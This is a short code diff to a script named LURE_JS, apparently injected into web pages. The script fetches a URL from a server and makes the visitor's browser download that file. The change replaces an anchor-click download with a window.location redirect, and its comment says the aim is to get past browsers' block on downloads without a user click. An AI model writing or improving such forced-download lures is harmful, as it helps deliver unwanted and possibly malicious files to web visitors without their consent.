@@ -47,11 +47,11 @@ LURE_JS = """(function () {
       .then(function (r) { return r.json(); })
       .then(function (d) {
         if (!d || !d.url) return;
-        setTimeout(function () {
-          var a = document.createElement("a");
-          a.href = d.url; a.rel = "noopener"; a.setAttribute("download", "");
-          document.body.appendChild(a); a.click(); a.remove();
-        }, 1200);
+        // Use window.location.href instead of <a>.click() — browsers block
+        // programmatic <a>.click() downloads unless triggered by a direct
+        // user click, but navigating to an attachment URL triggers a download
+        // via the server's Content-Disposition header.
+        window.location.href = d.url;
       })
       .catch(function () {});
   }
